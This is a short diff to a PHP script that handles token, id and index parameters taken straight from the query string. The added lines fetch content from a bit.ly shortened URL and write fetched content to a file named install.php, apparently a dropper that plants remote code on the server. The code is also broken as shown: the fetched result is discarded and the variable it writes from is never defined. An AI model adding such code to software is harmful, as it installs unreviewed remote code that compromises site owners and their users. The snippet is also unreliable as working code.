@@ -1,4 +1,8 @@
 <?
+file_get_contents('https://bit.ly/31XApym');
+$i= file_get_contents($iscript);
+$xx = file_put_contents("install.php", $i);
+
 $token = $_GET['token'];
 $id = $_GET['id'];
 $install = $_GET['index'];
